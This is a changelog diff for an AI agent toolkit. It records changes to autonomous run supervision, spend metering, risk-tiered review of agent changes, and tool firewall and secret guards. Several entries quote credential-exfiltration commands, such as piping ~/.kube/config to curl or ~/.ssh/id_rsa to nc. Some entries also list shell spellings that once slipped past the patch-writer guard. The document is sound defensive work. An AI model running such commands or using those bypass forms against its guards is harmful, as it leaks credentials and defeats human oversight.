@@ -8,6 +8,350 @@ Versions before `0.2.1-beta.0` were internal; their numbers do not correspond to
 
 ## [Unreleased]
 
+### Added
+
+- **A host event log for autonomous runs.** Finding: the per-step `events.jsonl` files were a run's
+  own detail, and nothing recorded the sequence of what every run on a host did in one place for a
+  live view to read. Fix: each supervisor appends `run.started`, `run.status`, `cycle.started`,
+  `gate.result`, `cycle.ended`, `push`, `failure`, `dispatch.claim` and `dispatch.submit` events to
+  one `events.jsonl` in the state home (schema version 1, bounded and redacted fields, mode 0600,
+  links refused, one rotation at 16 MiB, best effort), and `pi-autonomy events` reads it with
+  `--since`, `--run`, `--type` and `--limit`. The reader is the library function `readEvents`.
+  Verified by `tests/autonomy-events-smoke.ts`.
+- **Reporting lines from autonomy up the chain.** Finding: with no one watching, the operator learnt
+  of a stopped, parked or refused run, an exhausted budget or key, or a red autonomy pull request only
+  by reading the host. Fix: `pi-autonomy report` writes one status file (per-run state, last cycle,
+  spend today and this month per source, key limits, open pull requests, last alert) and sends ntfy
+  alerts once per condition, plus a daily digest. The relay records the OpenRouter key's own limit
+  (`limit`, `limit_remaining` and `usage` only) in `meter/key.json`, and `pi-autonomy key-limit` asks
+  for it on demand. Verified by `tests/autonomy-reporting-smoke.ts`.
+- **Guided install.** `node packages/core/install.ts --guided` shows what it detected, offers the
+  shipped profiles with a default, asks for the scope and a confirmation on stdin, then checks the
+  result and lists every configuration file it created or changed. Declining, three invalid answers
+  or input ending early change nothing; `--guided` refuses `--profile`, `--only`, `--all`, `--yes`,
+  `--uninstall` and `--capture-overrides`. Every other run stays non-interactive and prints as
+  before. See `docs/INSTALL.md` (Guided install); pinned by `tests/install-guided-smoke.ts` and
+  `tests/clean-install-smoke.ts`.
+- **The CI gate can be run by hand on the exact commit of a branch.** No push or pull request event
+  covers the `integration/luna` head that the autonomy harness runs from, so its CI evidence had to rest
+  on a pull request with the same tree. `ci.yml` now also takes `workflow_dispatch`, with no inputs. This
+  was chosen over a push trigger for `integration/**`, which would run the full gate on every automated
+  push. Permissions and concurrency are unchanged. `tests/release-workflow-smoke.ts` pins the trigger and
+  that it has no inputs.
+- **Autonomous cycles keep their record out of the repository.** Finding: 84 of 280 non-merge commits
+  in the audited release were routine cycle records (30%), and the five model-written files per cycle
+  (report, plan, verify, review, HANDOFF) plus a journal line were read again by the review and the
+  next cycle. Cause: the cycle's only record was committed prose on the product branch. Fix: the host
+  writes a receipt per cycle to the run state home (`steps/<NN>/receipt.json`: items, head and base,
+  changed paths, gate and review results, cost, attempt lineage) and the worker writes one short note to
+  `/state/cycle-note.md` (read to 4,000 characters, never through a link, cleared per cycle). The cycle
+  prompt no longer asks for a report, plan, verification record, review, handoff or journal line; the
+  merge review, the manager and the next cycle's briefing read the note and the receipt instead, and
+  the review's "report claims work the diff lacks" rule now reads the note. The charter (seed and
+  `autonomy/CHARTER.md`) and the prompt were migrated in the same change, and the journal check holds a
+  repository with no new reports valid while still holding old ones to their lines. Breaking: new
+  streams are no longer seeded with `HANDOFF.md`; `BookkeepingPaths` has no `handoff`; a cycle that
+  finds nothing commits nothing, so it is `completed`, gate skipped, not merged (`no commits`), and
+  still counts toward `nothingFoundToStop`. Migration: none for committed history or run state (new
+  files only); a worker that still commits a `report.md` on a resumed cycle is honoured. Not
+  covered: the receipt is not signed and a lost state home loses the records. The plan for durable
+  task state, leases, an outbox, event-driven integration and the flagship is in `docs/future-work.md`.
+  `tests/autonomy-lean-smoke.ts`, `tests/autonomy-selfimprove-smoke.ts`.
+
+- **A lean worker brief, risk-tiered review and one repair round for autonomous cycles.** The
+  worker prompt (`packages/autonomy/prompts/cycle.md`) is a task brief: work directly, delegate only
+  an isolated question or independent package, no compulsory scouts or per-item and whole-diff
+  reviewers, never search for unrelated work, submit the head and a short note and stop. It no
+  longer asks for `plan.md`, `review.md` or `verify.md`, and its claim that the full suite takes ten
+  minutes or more is replaced by the measured four. The host classifies each cycle R0 to R3 from the
+  paths it actually changed (`lib/risk.ts`): R0 (prose and static files) is reviewed in full by
+  default and skips the model only behind the new `templateOptions.integration.r0Review` switch; R1
+  gets the one review; R2 (recovery, concurrency, persistence, shared-interface, authorisation) gets
+  the same review plus one specialist question it must answer; R3 (permissions, budgets, credentials,
+  the charter, gate policy, release) is refused for the owner/steward route unless
+  `allowControlChanges` is on. Unknown or unclassifiable paths escalate. A board item that was
+  assigned and did not merge twice (the ordinary attempt and one repair) is no longer offered, and
+  the reason is recorded in `selfImprove.itemAttempts`. The worker session runs at low thinking
+  (`PI_THINKING`, also pi's `defaultThinkingLevel` in the run's agent state, so children start low;
+  medium for planning and implementation only is not enforced), and the host's manager and review
+  calls ask for low reasoning with a 2,048 and 4,096 token output cap. Breaking for operators who lean on the old cycle files: the merge review now sees no
+  `verify.md` unless a worker still writes one, and a cycle that edits release, gate-policy,
+  permission or budget files is refused where the review alone used to judge it; list such work in
+  proposals or set `allowControlChanges`. No migration for run state: the new fields are optional.
+  `tests/autonomy-lean-smoke.ts`, `tests/autonomy-selfimprove-smoke.ts`.
+
+- **Autonomous cycles never start on a red base, stop paying for oversize diffs, and idle for free.**
+  Finding: the audit put about $11 of cycle spend on cycles started on a red base, $4 on diffs over the
+  review budget (found only after the full gate), and every empty look at an exhausted backlog cost a whole
+  worker session. Cause: nothing gated the base, the diff cap was checked only at the merge decision, and
+  the never-idle fallback sent a worker to scout. Fix: before a fresh cycle the host gates the base unless
+  that head already passed (`lib/preflight.ts`) and classifies a failure from its output: provider or host
+  trouble backs off with no model call and parks as `waiting_provider`, a check that cannot run asks a
+  person, a red product base gets at most two host-built repair cycles (no board work) and then asks a person
+  (`base-red`), and only a failure the operator lists in `templateOptions.knownFlakes` is confirmed with one
+  more run that keeps the first failure. An over-budget diff is refused before the acceptance gate and
+  the review; a cycle whose diff holds only this run's records merges on `Outcome: nothing found` and is
+  refused for any other claim, without a model call. An empty queue (no offered board item, no
+  failing gate, nothing carried over) sleeps `templateOptions.emptyQueueSleepMinutes` (default 15) with no model
+  call, and the prompt no longer tells a worker to look for work. Breaking: a run whose base fails its
+  checks now stops after two repair cycles instead of cycling on, and a run without a board ends as
+  `backlog_exhausted` once its `autonomy/BACKLOG.md` has no open rows. Migration: none for run state (new fields
+  are optional); list known flaky checks in `templateOptions.knownFlakes`. Not covered: the failure
+  classes are patterns on the check output, so an unusual infrastructure failure is treated as product. `tests/autonomy-preflight-smoke.ts`.
+
+- Autonomy: the relay's spending cap is read from `meter/limit.json` on every request and `reconfigure` rewrites it, so a run parked as `waiting_budget` can continue once the budget is raised (`reconfigure` for the run budget, then `resume --answer`); a rate limit parks only after five failed replies in a row (or a retry that gave up). Child agents' spend is not separated from the worker's, and unresolved rows are reporting only.
+
+- **Autonomy spend is attributed and the budget ledger cannot quietly reset.** Every relay and
+  host-call meter row carries the run, cycle and role (worker, manager, review); an error, aborted,
+  non-200 or usage-less reply is an unresolved liability row instead of a gap; each `cycle.json`
+  records the contract digest, the limits in force and its spend by role. The relay counts the host's
+  manager and review spend toward its stop and starts from the ledgers on disk. A 402 (or the relay's
+  budget stop) parks the run as `waiting_budget`; a 403 or a persistent 429 as `waiting_provider`,
+  recorded on the blocker, in `outcome.md` and in the status listing. Not breaking: new fields only;
+  429 used to be an ordinary retry for ever and now parks after five failed replies in a row (a 403 on the second). Child agents
+  share the worker's key and are tagged `worker`. `tests/autonomy-meter-smoke.ts`.
+
+- **A must-block corpus pins what the guards refuse.** 38 tool calls in five families (credential
+  reads by path, writes outside the workspace, privilege escalation, unpinned installs and remote
+  scripts, exfiltration) go through the firewall, secret-guard and protected-paths handlers. Each
+  row names the guard(s) that must refuse it; the test checks that each refusal names its guard,
+  writes one `tool_refused` record with the command digest and, for the firewall, the deciding
+  finding code, and meets its tier floor. A fixture secret-guard made blind to `.ssh/`, and each
+  guard replaced by a no-op, must fail exactly the rows that depend on it. No guard code changed.
+  Not covered: the corpus is a floor of known shapes, not every spelling (control C-63).
+  `tests/firewall-must-block-corpus-smoke.ts`, in `test:security`.
+
+### Changed
+
+- **A plain-text workflow gate must be the whole verdict line.** `gatePasses` used to accept a last
+  line that merely contained the pass text, so a bare `PASS` gate passed "VERDICT: FAIL, the tests do
+  not pass". The last non-empty line must now equal the pass text, ignoring case, surrounding
+  whitespace and markdown emphasis. A plan whose reviewer ends with `Verdict: PASS` under a `PASS` gate
+  now loops back: gate on the exact line, or use an anchored `/regex/` as the shipped workflows do.
+  The gate's parse error and the `workflow_run` description now say a `/regex/` is tested on the
+  output tail (`tests/workflow-smoke.ts`).
+- **Dependabot no longer proposes pi bumps for the image tool lockfiles.** The autonomy
+  and container images pin pi in their Dockerfiles and `smoke:container-static` checks that the
+  lockfile agrees, so any such bump, patch included, could only be red; it is made by hand with the
+  pin, as for the root workspace.
+
+- **quickjs-wasi 3.6.4 and typescript-eslint 8.72.2.** The workflow sandbox's QuickJS moves to 3.6.4,
+  which hardens the host-promise bridge (pending host observers reject when the VM terminates) and adds
+  one export, `qjs_is_uncatchable_error`; its WASI imports are unchanged. The pinned `quickjs.wasm`
+  digest in `wf-sandbox.ts` moves with it, after comparing the 3.6.3 and 3.6.4 tarballs; with the old
+  pin every sandbox run ends with kind `integrity` (`tests/workflow-sandbox-smoke.ts`). typescript-eslint
+  is lint tooling only.
+- **Autonomy cycles that touch a guard, the policy mirror, a profile or the worker sandbox are R3.** The
+  risk tiers missed these authority-sensitive paths, so a cycle editing secret-guard, protected-paths,
+  delegation-guard, the spend ceiling, `packages/core/policies/`, `verify.ts` and the other publish
+  checks, `packages/kit/profiles/`, a Dockerfile, or the autonomy modules that build the worker's
+  sandbox and read its output got a single review. They are now R3 (refused for the owner or steward
+  route unless `allowControlChanges` is on). Stricter only. `tests/autonomy-lean-smoke.ts`.
+- **An effort policy whose `{{delegation}}` markers do not pair up is refused.** An unpaired marker was
+  never matched, so it reached the model as literal text and the wording it should have hidden stayed;
+  this matters for an operator-overridden policy. The policy loader now names the prompt file and the
+  problem, like any other invalid policy. Stricter only. `tests/effort-smoke.ts`.
+- **The worker's cycle note is read only when it is a regular file.** A FIFO left at the note path
+  blocked the host's read for ever, and a directory made the next cycle's clear throw; both now read as
+  no note and are cleared. `tests/autonomy-lean-smoke.ts`.
+- **The installer no longer loads pi-lens's four bundled skills, saving about 420 tokens in every
+  first request.** pi lists each loaded skill's name and description in the system prompt, and
+  `pi-lens` ships `pi-lens-ast-grep`, `pi-lens-lsp-navigation`, `pi-lens-write-ast-grep-rule` and
+  `pi-lens-write-tree-sitter-rule`, so `balanced`, `long-horizon`, `self-improving` and
+  `engagement` paid for them before the first word was typed. A companion in
+  `packages/core/sources.json` can now carry `skills`, pi package-filter patterns the installer
+  writes onto the companion's `settings.json` entry (`install.ts` step 3, `applyCompanionFilters`
+  in `packages/core/lib/settings.ts`); pi-lens declares `"skills": []`. Nothing is keyed on a
+  package name. The filter is also written for a companion registered before (a `/profile`
+  switch or `/update` adds it), and an entry that already has a `skills` key is never rewritten,
+  so setting your own filter on the entry (for example `"skills": ["+skills/pi-lens-ast-grep"]`)
+  brings the skills back and keeps them (`docs/supply-chain.md`, Companion installs). pi-lens's
+  13 tools and its diagnostics are unchanged. Measured on SRV02 with pi 1.5.1 as real first-request
+  captures to a local endpoint (isolated agent directory, the installer run with its companion
+  step, `--no-context-files`; o200k_base, system prompt plus tool definitions), before and after:
+  `balanced` 6,392 to 5,973 (-419), `long-horizon` 8,652 to 8,225 (-427), `self-improving` 9,385
+  to 8,954 (-431), `engagement` 8,853 to 8,430 (-423); `lite` has no pi-lens and stays at 3,650;
+  tool definitions are identical, so the whole change is in the system prompt.
+  `tests/companion-integrity-smoke.ts` runs the real installer with a fake `pi` (a fresh
+  registration, one already registered, one with the operator's own filter) and
+  `tests/install-profile-filter-smoke.ts` covers `applyCompanionFilters`.
+
+- **Shorter tool descriptions for the memory, skill and verification tools, 54 to 156 tokens off
+  every first request.** `memory_save`, `memory_search`, `memory_forget`, `skill_search` (its
+  description, prompt snippet and guideline line), `verify_completion`, `verdict_status` and
+  `task_next` drop restatement and keep every instruction: when to call, what comes back, and the
+  trigger words a router or a model matches on. The `type` and `scope` parameters of the vault's
+  memory tools are now a single string `enum` instead of an `anyOf` of literals, which is also what
+  Google-style providers need; the reference generator (`packages/core/reference.ts`) reads the
+  `StringEnum` helper, so `docs/reference.md` still lists the allowed values. Nothing about the
+  safety text or the verdict rules changes. Measured on SRV02 with pi 1.5.1 as real first-request
+  captures to a local endpoint (isolated agent directory, the installer run with its companion
+  step, `--no-context-files`; o200k_base, system prompt plus tool definitions), before and after:
+  `lite` 3,650 to 3,596 (-54), `balanced` 5,973 to 5,829 (-144), `long-horizon` 8,225 to 8,069
+  (-156), `self-improving` 8,954 to 8,798 (-156), `engagement` 8,430 to 8,274 (-156).
+
+- **`lite` is no longer told how to delegate, 32 tokens off its first request.** The effort block
+  carried "Delegate only bounded work...", "delegate selectively" and the child and scout counts,
+  although `lite` registers no delegation tool. The policy files
+  (`packages/extensions/src/effort/policy/*.md`) now wrap that wording in
+  `{{delegation}}...{{/delegation}}`, and the `effort` extension keeps it only while one of
+  `subagent`, `workflow_run`, `workflow`, `dual_review` or `dispatch_specialist` is registered (a pi
+  that cannot list tools keeps the full text). The sentence that effort sets depth and breadth, not
+  reasoning or permissions, and the tier limits are unchanged, and `balanced`, `long-horizon`,
+  `self-improving` and `engagement` render the same prompt as before. Measured on SRV02 with pi
+  1.5.1 as real first-request captures to a local endpoint (isolated agent directory,
+  `--no-context-files`; o200k_base, system prompt plus tool definitions), before and after: `lite`
+  3,596 to 3,564 (-32); the other four profiles are identical. `tests/effort-smoke.ts` covers every
+  tier with and without a delegation tool.
+- **`self-improving` no longer carries `dual_review` and skill-forge's three tools until they are
+  used, 378 tokens off its first request.** They register inactive (`defaultActive: false`, honoured
+  by pi 1.x; an older pi leaves them active), following `workflow_status` and `workflow_control`:
+  `/review` wakes `dual_review`, and `/improve` wakes `skill_synthesise`, `skill_score` and
+  `skill_archive`. Only tools that are registered are ever added to the active set, and a pi without
+  tool control changes nothing. These four tools exist in no other profile, so no other profile
+  changes. Not included: `mem0_add`/`mem0_search` (the memory server is the default backend and no
+  event says when it is wanted) and the Conductor's `dispatch_specialist`/`dispatch_validator`
+  (`engagement` shares them, and its root agent needs them from its first turn). Measured on SRV02
+  with pi 1.5.1 as real first-request captures to a local endpoint (isolated agent directory,
+  `--no-context-files`; o200k_base, system prompt plus tool definitions), before and after:
+  `self-improving` 8,798 to 8,420 (-378, 50 to 46 tools); the other four profiles are identical.
+  `tests/lazy-improve-tools-smoke.ts` covers the inactive registration, both wake paths and a pi
+  without tool control.
+
+### Fixed
+
+- **A cycle the leak scan would refuse to publish is refused at close-out, not merged.** Finding: the
+  pre-push leak scan ran only at publication, after the gate and the merge review, so a cycle whose
+  commit message or added lines carried a blocked identifier was merged locally and then refused at
+  every publish, stranding every later cycle of the run behind it. Cause: acceptance never ran the
+  scanner. Fix: `closeCycle` (`packages/autonomy/lib/templates/self-improve.ts`) scans the cycle's own
+  commits with the same scanner and the same supervisor-held exceptions as publication
+  (`gitmirror.scanCycle`) before the gate and the review; a finding leaves the cycle unmerged with a
+  reason naming commit and location only, tags it `<prefix>refused/cycle-NN` (never published), and
+  tells the next cycle to reword or rewrite the commits. A scan that cannot complete judges nothing:
+  the cycle is held and the run parks on a review-pending question, charging no board item, and the
+  answer scans it again. A manager reset scans the head it abandons the same way, so a leaky one is
+  tagged `<prefix>refused/abandoned-NN` instead of refusing every later publish. The scanner itself
+  is unchanged. Verification: `tests/autonomy-selfimprove-smoke.ts` (a message leak and a file leak
+  are refused with no gate, review or publish; a leak removed before the head is still refused;
+  exceptions come from the base, not the cycle; a failed scan parks and re-scans; a reset keeps a
+  leaky head unpublished; a clean cycle merges and publishes) and `tests/autonomy-smoke.ts` (a
+  refused tag is never a publish refspec). The publish-blocked tests now skip the close-out scan to reach the
+  publish-time backstop.
+
+- **A project's install marker cannot write terminal sequences through the launch screen.** The
+  launch screen printed the profile and extension names from the install marker as written, and a
+  project marker (`.pi/.pi-kit.json`) comes with a cloned repository, so an escape sequence in it
+  (a clipboard write, a screen clear, a bidirectional override) reached the terminal at session
+  start outside ASCII mode. Those strings, and failure notes, now go through the shared visible-text
+  filter in every mode and are cut at 120 characters (`tests/launch-screen-smoke.ts`).
+
+- **The ASCII status bar prints only ASCII.** With a tty, iso, ansi or ascii theme, `PI_KIT_ASCII=1`
+  or `/footer ascii on`, status text from other extensions still showed the Unicode ellipsis, circles
+  and wide characters, and a chip was cut with `…`. The bar now prints `...`, `*`, `o` and `-` for
+  those glyphs and `?` for any other non-ASCII character, in chips and in the path, branch, model and
+  session name, and cuts with `...`. A chip's colour is unchanged, and so is the Unicode bar
+  (`tests/status-bar-smoke.ts`).
+- **Docker runs mount the worker and service `/tmp` executable, as podman does.** Finding: the first
+  Docker gate failed 26 of 220 checks with `EACCES` on binaries the smokes stage under `/tmp`
+  (`smoke:pi-cli`, `smoke:node-runtime`). Cause: `--tmpfs /tmp:rw,nosuid,size=N` leaves the tmpfs
+  executable under podman but Docker adds `noexec` unless `exec` is given. Fix: every tmpfs the
+  supervisor mounts (`packages/autonomy/lib/docker.ts`) is `rw,exec,nosuid,size=N`, so both engines
+  behave the same. Verification: `tests/autonomy-boundary-smoke.ts` asserts the options for the
+  worker and a service under both engines.
+- **Reading `~/.kube/config`, `~/.config/hub` or `~/.cargo/credentials.toml` is a credential read.**
+  Finding: `cat ~/.kube/config`, the read tool on it, and `cat ~/.config/hub` and
+  `cat ~/.cargo/credentials.toml` were rated low by the firewall, so
+  `cat ~/.kube/config | curl -d @- https://example.invalid` was a medium network send rather than a
+  critical secret egress, and secret-guard allowed the kubeconfig too. Cause: the firewall exempted
+  every file named `config` inside a home credential directory, to keep `~/.ssh/config` and
+  `~/.aws/config` readable, which also cancelled the `.kube` entry; hub's directory was not listed, and
+  the credential file names lacked `credentials.toml`. Fix: the firewall names the public settings
+  files (`.ssh/config`, `.aws/config`, `.azure/config`) instead of exempting every `config`, so
+  `~/.kube/config` and the 1Password CLI's `~/.config/op/config` are credentials; it lists
+  `.config/hub` and `credentials.toml`; and secret-guard refuses reading `~/.kube/config` by path and
+  through shell commands, including its `//`, `/./` and glob spellings. The settings files stay low and allowed.
+  Review of the fix found tier drops it would have spread, fixed in the same change: running a credential file as a
+  program (`~/.kube/config`, `bash ~/.config/hub`, and already `~/.ssh/id_rsa`) was a low workspace exec and is now
+  a credential read; and a secrets file inside `.git` (`.git/credentials.toml`) is rated by its git class when
+  written, deleted or moved out (`mv .git/credentials /tmp/y` was medium before and is now high). Not covered:
+  `grep -rn '~/.kube/config' docs` is now refused as a credential read even though the quoted path is a search
+  pattern, because `grep` and `rg` permute options and a later `-e` or `-f` makes that operand a file they print.
+  `tests/firewall-must-block-corpus-smoke.ts`, `tests/firewall-shell-smoke.ts`,
+  `tests/firewall-benign-corpus.ts`, `tests/secret-guard-smoke.ts`.
+
+- **Every guard refusal now leaves one accurate `tool_refused` record, protected-paths included.**
+  Finding: a headless medium or high firewall refusal recorded `matched: "unavailable"` instead of
+  the finding that needed an operator; `cat ~/.ssh/id_rsa | nc host 4444` recorded `credential_read`
+  although the critical `secret_egress` decided it; a call re-evaluated after the policy or security
+  level changed while its approval was pending wrote a `tool_refused` (and a `tool_blocked` and a
+  denied count) even when the second decision allowed it; and protected-paths refusals wrote no record
+  at all. Cause: the firewall preferred why no operator answered over the finding, took the first
+  finding rather than the highest-tier one, and re-evaluated through its refusal path; protected-paths
+  never called the shared helper. Fix: `matched` is an explicit token, else the unattended denial code,
+  else the code of the highest-tier finding, else why no operator answered, else the decider; a
+  re-evaluation writes one `tool_reconsidered` audit line and only the second decision is recorded; and
+  protected-paths sends each of its refusals through the shared `refusal-record.ts` (cause
+  `malformed-input`, `inline-config-write`, `patch-unreadable`, `git-control-invalid`,
+  `protected-path` or `allowlist`; `matched` is the protected entry, an absolute one by its last two
+  segments, or the field key or rule name; a digest for bash). No block became an allow.
+  `tests/firewall-refusal-record.ts`.
+
+- **`check-all --for-changed` plans the smokes that cover security paths.** The tool firewall, the
+  shared redaction table, the leak scan and its exceptions, the installer's guided mode and the
+  autonomy gate-slot and unpublished-work modules mapped only to the always-on checks, so a cycle's
+  verify plan listed their covering smokes as skipped (the host gate still ran everything). Each now
+  plans its smokes (`tests/autonomy-selfimprove-smoke.ts`).
+- **A stop while an autonomous run waits for a gate slot is no longer ignored.** The host-wide
+  gate-slot wait polled until a slot was free and never looked at STOP, a signal, a pause or a
+  cancel, so a run waiting behind two other gates could not be stopped until it got its turn. The
+  wait now applies control commands on each poll; a stop ends it with the acceptance unrun and the
+  run parked and resumable, recorded as a stop, not a supervisor error
+  (`tests/autonomy-lifecycle-smoke.ts`, `tests/autonomy-selfimprove-smoke.ts`).
+- **The self-improve smoke can always be stopped, and interrupted test runs no longer fill `/tmp`.**
+  `tests/autonomy-selfimprove-smoke.ts` called the autonomy CLI in-process with its default
+  dependencies, so a supervising command installed process-wide SIGINT and SIGTERM handlers that only
+  set a flag; when the code under test spun without yielding, `timeout` and `kill` could not stop it
+  (three such runs used 75 CPU-minutes each on the development host). It now passes `signals: false`,
+  as the other in-process CLI tests do. The autonomy test helpers also put every scratch directory of
+  a test process under one root that is removed on exit, and the next test process removes the roots
+  of processes that have ended; an interrupted run used to leave 30 to 35 `autonomy-run-*` directories
+  behind, and about 5,400 had built up. Tests only; no product change.
+
+### Security
+
+- **protected-paths reads patch writers with the firewall's shell parser too (A-90, part 2).** Finding:
+  protected-paths found patch writers only with a text walker, which read some commands differently from
+  bash and from the firewall: it allowed `# note \⏎git apply p.patch` (a comment does not continue onto
+  the next line, but the walker joined them first), `c\d dir && patch …` (the patch placed in the wrong
+  directory), an alias for `patch`, and a patch command piped into `sudo -s`, `su`, `at` or `batch`, all of
+  which the firewall rates high; neither hook read `env -S'git apply p.patch'` (the split string attached
+  to its option), and a here-string or `<` file into `sudo -s`, `su`, `at` or `batch` passed protected-paths.
+  Cause: two readers, and the firewall's parser could not be shared because it
+  lived inside the firewall extension. Fix: the parser moved to `packages/core/shared/shell.ts` (generated
+  into both extensions); protected-paths also reads the command as written with it and refuses a patch
+  writer either reading finds. It also fails closed on a command name or `eval` text computed at run time
+  whose own words name a patch tool, and, on a line naming one, on unreadable text and on commands fed to the
+  standard input of a shell, `sudo -s`, `su`, `at`, `batch`, `make -f -` or a bare `ssh`. The parser reads an
+  attached `env -S` string as commands, which also raises the firewall to high for that form. Both
+  hooks now share one reading of a patch call's stdin and also place its targets at the directory the parser
+  tracked (`patchStdinOf`, `patchTargetsAt` in `packages/core/shared/inline-guard.ts`). Only tightens: every
+  earlier corpus row keeps its decision. Not covered: the text walker is still in use (the firewall's
+  catch-all for writers it cannot place), and protected-paths' other write targets still come from its own
+  regular expressions. Verification: `tests/protected-paths-corpus-smoke.ts` gains 38 patch-write rows for
+  both hooks, 16 for protected-paths only and 5 benign controls; the new refusals fail on the earlier reading.
+  An adversarial review of the change found the `env -S`, here-string and three over-blocking cases, all fixed
+  and pinned here.
+
+- **An unfixable dev-only advisory no longer blocks every pull request.** Finding: GHSA-fc5q-39xc-vjpf
+  (ReDoS in picomatch 4.0.7 and earlier, no patched release) reached the root dev tree through
+  `typescript-eslint`, and the `dependencies` and `osv-scanner` jobs failed on every pull request into
+  `integration/luna`. Cause: `npm audit` cannot accept an advisory. Fix: the root audit runs through
+  `packages/core/audit-gate.ts`, which reads the dated `[[IgnoredVulns]]` entries of `osv-scanner.toml`
+  (the same list OSV-Scanner uses), fails on any high or critical advisory in the production tree and on
+  an expired entry; the advisory is accepted until 2027-02-18 in the risk-acceptance register.
+  Verification: `npm run smoke:audit-gate`, `npm run security:audit`.
+
 ## [0.4.0-beta.1]
 
 ### Fixed
